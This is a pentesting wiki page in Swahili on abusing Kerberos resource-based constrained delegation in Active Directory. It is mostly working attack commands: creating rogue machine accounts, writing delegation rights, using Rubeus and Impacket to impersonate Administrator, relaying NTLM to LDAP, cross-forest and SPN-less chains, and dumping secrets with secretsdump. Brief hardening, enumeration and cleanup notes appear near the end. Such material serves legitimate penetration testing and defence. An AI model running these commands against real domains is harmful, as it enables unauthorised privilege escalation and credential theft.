# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) inafanana na [constrained delegation](constrained-delegation.md), lakini mwelekeo wa trust umegeuzwa. Traditional constrained delegation hurekodi ni services zipi principal anaweza ku-delegate; RBCD hurekodi kwenye **target resource** ni principals wapi wanaoweza ku-impersonate users kwake.<sup>[[12]](#references)</sup>

Attribute ya target object _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ina security descriptor inayotambua principals walioruhusiwa kutenda kwa niaba ya identities nyingine kwenye resource hiyo.

Tofauti nyingine muhimu ni kwamba principal mwenye **write permissions za kutosha kwenye machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, na rights zinazofanana) anaweza kuwezeshwa kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Kusanidi traditional constrained delegation kwa kawaida huhitaji administrative access yenye privileges zaidi.<sup>[[1]](#references)</sup>

Kwa usahihi zaidi, kubadilisha settings za classic constrained-delegation kwa kawaida hudhibitiwa na `SeEnableDelegationPrivilege` kwenye domain controller, right ambayo kwa kawaida huwa nayo administrators wenye privileges za juu sana. RBCD huhamisha uamuzi huo kwenye security descriptor ya target object, hivyo write access kwenye computer-object property husika inaweza kutosha bila user huyo kuwa na user right hiyo.<sup>[[1]](#references)[[2]](#references)</sup>

### Dhana Mpya

Flag ya **`TrustedToAuthForDelegation`** kwenye `userAccountControl` mara nyingi huelezewa kama prerequisite ya **S4U2Self**, lakini hilo si kamili.\
Service principal yenye SPN inaweza kuomba S4U2Self bila flag hiyo. Ikiwa ina `TrustedToAuthForDelegation`, service ticket inayorejeshwa huwa **forwardable**; bila hiyo, ticket kwa kawaida huwa **non-forwardable**.<sup>[[5]](#references)</sup>

Traditional constrained delegation hukataa **non-forwardable TGS** katika hatua ya S4U2Proxy. RBCD inaweza kukubali S4U2Self ticket hiyo wakati security descriptor ya target inaruhusu service inayoomba.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Muundo wa Attack

> Ikiwa una **write-equivalent privileges** kwenye **computer account**, unaweza kuwezeshwa kupata privileged access kwenye machine hiyo.

Chukulia kwamba attacker tayari ana **write-equivalent privileges kwenye victim computer object**.

1. Attacker **hu-compromise** account yenye **SPN** au **huunda moja** ("Service A"). Kwa default, authenticated domain user anaweza kuunda hadi computer objects 10, kama inavyodhibitiwa na **_MachineAccountQuota_**; computer object hutoa moja kwa moja SPNs zinazoweza kutumika.
2. Attacker **hutumia vibaya WRITE privilege yake** kwenye victim computer (ServiceB) ili kusanidi **resource-based constrained delegation kumruhusu ServiceA ku-impersonate user yoyote** dhidi ya victim computer huyo (ServiceB).
3. Attacker hutumia Rubeus kutekeleza **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa user **mwenye privileged access kwenye Service B**.
1. S4U2Self (kutoka kwenye SPN account iliyo-compromised au iliyoundwa): omba **TGS inayowakilisha Administrator kwa Service A** (non-forwardable).
2. S4U2Proxy: tumia **non-forwardable TGS** hiyo kuomba service ticket inayowakilisha **Administrator** kwa **victim host**.
3. Ticket ya non-forwardable bado inaweza kufanya kazi katika RBCD flow hii kwa sababu Service A imeidhinishwa kwenye security descriptor ya target resource.
4. Attacker anaweza **pass-the-ticket** na **ku-impersonate** user huyo ili kupata **access kwenye victim ServiceB**.<sup>[[1]](#references)</sup>

Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Mashambulizi

### Kuunda Computer Object

Unaweza kuunda computer object ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia moduli ya Active Directory PowerShell**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kufanya shambulio kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliunda object mpya ya Computer yenye password `123456`, kwa hivyo tunahitaji hash ya password hiyo:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha hash za RC4 na AES za akaunti hiyo.\
Sasa, shambulio linaweza kutekelezwa:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kutengeneza tiketi zaidi za services zaidi kwa kuuliza mara moja tu ukitumia parameta ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Users can be marked **"Account is sensitive and cannot be delegated."** If that flag is enabled, the account cannot be impersonated through this delegation flow. BloodHound exposes this property during analysis.

### Zana za Linux: RBCD ya mwanzo hadi mwisho kwa kutumia Impacket (2024+)

Ikiwa unatumia Linux, unaweza kutekeleza mnyororo kamili wa RBCD kwa kutumia zana rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Maelezo
- Ikiwa LDAP signing/LDAPS imelazimishwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea AES keys; domains nyingi za kisasa huzuia RC4. Impacket na Rubeus zote zinaunga mkono flows za AES-only.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya tools, lakini pata SPN sahihi inapowezekana (kwa mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD ya cross-domain & cross-forest

Ikiwa **delegating principal** unayodhibiti iko katika **different domain** (au hata **different forest**) na **resource computer**, matumizi mabaya bado ni **RBCD**, lakini ticket flow si tena ya kawaida ya `S4U2Self -> S4U2Proxy` ya single-domain.

### Cross-domain RBCD: configure foreign principal kwa SID

Unapoweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka **different domain**, foreign machine/user huenda **isirekebishwe kwa jina** katika target domain LDAP. Katika hali hiyo, configure delegation entry kwa kutumia **SID** ya foreign principal badala ya sAMAccountName/UPN yake.

Hili ni muhimu hasa wakati wa relaying NTLM kwenda LDAP kwa `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Maelezo:
- `--sid` huiambia `ntlmrelayx.py` ichukulie `--escalate-user` kama SID, jambo linalohitajika wakati akaunti inayotoa delegation ni ya nje ya target domain.
- Hata kama tool itaonyesha `User not found in LDAP`, uandishi wa delegation bado unaweza kufanikiwa kwa sababu security descriptor huhifadhi SID ya nje moja kwa moja.

### Cross-domain RBCD: cross-realm S4U sequence

Mara tu principal ya nje inapokuwa kwenye `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko unaofanya kazi wa cross-domain ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya delegating principal kutoka domain yake yenyewe.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya mtumiaji anayefanyiwa impersonation kwenye target-domain DC.
4. Omba ticket halisi ya **S4U2Self** ya mtumiaji huyo nyuma katika delegator domain.
5. Tekeleza **S4U2Proxy** katika delegator domain ili kupata referral ticket ya target domain.
6. Tekeleza **S4U2Proxy** ya mwisho kwenye target-domain DC ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu Linux tooling ya kawaida mara nyingi hushindwa katika cross-domain RBCD:<sup>[[9]](#references)</sup>
- **realm** ya ombi inaweza kuhitaji kuwa tofauti na realm ya TGT iliyotumika kwenye `TGS-REQ`
- mnyororo unahitaji **independent S4U2Proxy steps**, si **S4U2Self** pekee au **S4U2Self** inayofuatwa mara moja na **S4U2Proxy** moja

### Cross-domain RBCD kutoka Linux

Synacktiv ilichapisha utekelezaji wa Impacket `getST.py` unaorudia cross-realm sequence kutoka Linux kwa kushughulikia KDC mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Kivitendo, hoja mpya ni:
- `-dc-ip`: DC ya domain ya **delegating**
- `-targetdomain`: domain ya computer ya resource
- `-targetdc`: DC ya domain ya **resource**

### Vikwazo vya Cross-forest RBCD

Cross-forest RBCD ina kikwazo muhimu: **mtumiaji anayefanyiwa impersonation lazima awe wa forest sawa na principal wa delegating**. Kwa maneno mengine, ikiwa machine account unayoidhibiti iko katika `valhalla.local` na resource inayolengwa iko katika `asgard.local`, kwa ujumla **huwezi ku-impersonate watumiaji holela wa `asgard.local` kwenye resource hiyo kupitia RBCD**.<sup>[[9]](#references)</sup>

Bado inaweza kutumika wakati:
- mtumiaji wa **delegating forest** ni **local admin** (au ana privileges nyingine) kwenye host ya resource katika forest nyingine
- trust inaruhusu njia inayohitajika ya authentication na SID ya kigeni inakubaliwa katika security descriptor ya computer inayolengwa

### Upekee wa protocol wa Cross-forest RBCD

Cross-forest RBCD si "cross-domain pamoja na trust" tu. Flow iliyobainika ina upekee miwili ambao tools nyingi za kawaida kihistoria hazijumuishi:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Service ticket ya mwisho ambayo inaweza kurudishwa kwa kutumia **RC4** hata wakati etypes nyingine ziliombwa

Flow ya kivitendo ni:

1. Pata TGT ya delegating principal katika forest A.
2. Omba **S4U2Self** kwa ajili ya mtumiaji anayefanyiwa impersonation katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma **S4U2Proxy** ya pili katika forest A **bila S4U2Self ticket kama additional ticket**, lakini ukiwasha `branch-aware`, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba service ticket ya kawaida katika forest B kwa ajili ya delegating principal (ticket hii haihitajiki kwa abuse ya mwisho).
6. Tumia referral tickets kutoka hatua ya 3 na 4 kuomba ticket ya mwisho ya **S4U2Proxy** katika forest B kwa ajili ya mtumiaji wa forest A anayefanyiwa impersonation, kuelekea target SPN.

### Cross-forest RBCD kutoka Linux

Branch hiyo hiyo ya Synacktiv Impacket inaongeza switch ya `-forest` kwa logic hii:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (domains 3+)

Katika **misitu yenye domains nyingi**, **S4U2Self** na **S4U2Proxy** zote zinaweza kuwa **recursive** badala ya kusimama baada ya referral moja:

- **Recursive S4U2Self**: `S4U2Self` ya kwanza hutumwa kwenye **domain ya mtumiaji anayeigwa**, hops za kati za parent/child hupitiwa kwa referrals za kawaida za `TGS-REQ` za `krbtgt/<REALM>`, na **`S4U2Self` ya mwisho** hutumwa kwenye **domain yake mwenyewe principal anaye-delegate**.
- Hii inamaanisha kuwa **kuwa tu na TGT** ya machine account kunaweza kutosha ku-impersonate **admin kutoka domain nyingine ndani ya forest hiyo hiyo** na kuomba `cifs/host`, `host/host`, `wsman/host`, n.k.
- **Recursive S4U2Proxy** hufuata trust chain kwa njia hiyo hiyo: hops za kati hutumia tena ticket ya awali kama TGT huku zikiomba referral ya `krbtgt/<REALM>` inayofuata, na hop ya mwisho pekee ndiyo hurudisha service ticket ya mwisho.<sup>[[10]](#references)</sup>

Mfano wa kiutendaji wa same-forest ni:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD ya cross-domain / cross-forest bila SPN

Ikiwa **delegating principal ni user asiye na SPN**, `S4U2Self` ya mwisho ya recursive hushindwa kwa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Workaround ni **kujaribu tena hop ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari mfupi wa abuse chain:

1. Authenticate kwa kutumia **NT hash** ili KDC isukumwe kuelekea **RC4-HMAC (etype 23)**.
2. Omba **`-self -u2u`** kwanza na uhifadhi ticket hiyo kando na proxy step ya baadaye.
3. Extract **TGT session key** kwa kutumia `describeTicket.py`.
4. Badilisha **NT hash** ya user na **session key** hiyo kwa kutumia `changepasswd.py -newhashes <session_key>`.
5. Tumia tena ticket ya **`S4U2Self+U2U`** kama **`-additional-ticket`** wakati wa ombi tofauti la **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Tahadhari za kiutendaji:

- Wakati **first trusted hop tayari ni forest nyingine**, pendelea algorithm ya **branch-aware** (`getST.py ... -forest`) ili kuendana na tabia asili ya Windows. Ikiwa foreign forest inafikiwa baadaye tu kwenye chain, mtiririko wa recursive usio wa branch-aware bado unaweza kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye DC za hivi karibuni za **Windows Server 2022/2025**, RC4 ya kulazimishwa inaweza kushindwa kwa **`KDC_ERR_ETYPE_NOSUPP`** kutokana na kuondolewa kwa RC4; hii inaweza kufanya **SPN-less RBCD** isiwezekane, ingawa RBCD ya kawaida inayotegemea SPN bado hufanya kazi kwa AES.<sup>[[15]](#references)</sup>
- Tekeleza **`S4U2Self+U2U` kabla ya kubadilisha hash/password ya mtumiaji**: `SamrChangePasswordUser` **haikokotoi upya** funguo za AES za Kerberos za account, hivyo kubadilisha password kwanza kunaweza kuvuruga maombi ya tiketi yatakayofuata.<sup>[[14]](#references)</sup>
- Account inayofanyiwa impersonation lazima bado iwe **delegable**: **Protected Users** na accounts zilizo na **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia chain.

## Maelezo ya detection / hardening

- Njia za RBCD zinazovuka domains/forests bado kwa kawaida huundwa kupitia **ACL abuse** au **relay-to-LDAP**. Tekeleza **LDAP signing** na **LDAP channel binding** kwenye DCs ili kuvunja njia za kawaida za setup.
- Kagua nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects na utatue SIDs zilizohifadhiwa, zikiwemo **foreign security principals**.
- Katika mazingira yenye trust nyingi, kagua **Selective Authentication**, **SID filtering**, na ikiwa users kutoka foreign forest wana haki za **local admin** kwenye resource hosts.

### Kufikia

Mstari wa mwisho wa command line utafanya **shambulio kamili la S4U na ku-inject TGS** kutoka kwa Administrator hadi kwenye host lengwa katika **memory**.\
Katika mfano huu, TGS iliombwa kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Tumia vibaya service tickets tofauti

Jifunze kuhusu [**service tickets zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuhesabu, kukagua na kusafisha

### Hesabu computers zilizo na RBCD iliyosanidiwa

PowerShell (kudecode SD ili kutatua SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (soma au flush kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Kusafisha / kuweka upya RBCD

- PowerShell (futa sifa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa kerberos imesanidiwa kutotumia DES au RC4, na unatoa hash ya RC4 pekee. Mpe Rubeus angalau hash ya AES256 (au mpe hashes za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa `-self` kwa user wa kawaida: principal anayefanya delegation huenda **hana SPN**. Jaribu tena **last hop** kama **`S4U2Self+U2U`** badala ya `S4U2Self` ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya lazima ya **RC4-HMAC** inayohitajika na ujanja wa **`S4U2Self+U2U` + session-key-substitution**. Jaribu njia ya kawaida ya **SPN-backed** RBCD ukitumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa muda wa computer ya sasa unatofautiana na muda wa DC, na kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa username + hashes zilizotolewa hazifanyi kazi ku-login. Huenda umesahau kuweka alama ya "$" ndani ya username wakati wa kutengeneza hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
- User unayejARibu ku-impersonate hawezi kufikia service inayotakiwa (kwa sababu huwezi ku-impersonate au hana privileges za kutosha)
- Service iliyoombwa haipo (ukiomba ticket ya winrm lakini winrm haiendeshwi)
- Fakecomputer iliyoundwa imepoteza privileges zake kwenye server iliyo vulnerable, na unahitaji kuzirudisha.
- Unatumia classic KCD; kumbuka RBCD hufanya kazi na tickets za S4U2Self zisizo forwardable, ilhali KCD inahitaji ziwe forwardable.

## Vidokezo, relays na alternatives

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Angalia:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Relay chains za Kerberos mara nyingi huishia kwenye RBCD ili kufanikisha local SYSTEM kwa hatua moja. Angalia mifano ya vitendo kutoka mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **imezimwa** na unaweza kuunda machine account, tools kama **KrbRelayUp** zinaweza kurelay Kerberos auth iliyolazimishwa kwenda LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa machine account yako kwenye target computer object, na mara moja ku-impersonate **Administrator** kupitia S4U ukiwa off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Kumwagisha Mbwa: Kutumia Vibaya Resource-Based Constrained Delegation Kushambulia Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Neno Jingine Kuhusu Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Kuchukua Umiliki wa Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Matumizi Mabaya ya Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Iliua Domain: Muhtasari wa Offensive Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (rasmi)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Cheatsheet Fupi ya Linux yenye syntax ya hivi karibuni](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing ikiwa imezimwa → Kerberos relay hadi RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Kuchunguza RBCD ya cross-domain na cross-forest](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Kuchunguza RBCD ya cross-domain na cross-forest: sehemu ya 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Muhtasari wa Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Kugundua na kurekebisha matumizi ya RC4 katika Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Maelezo ya S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
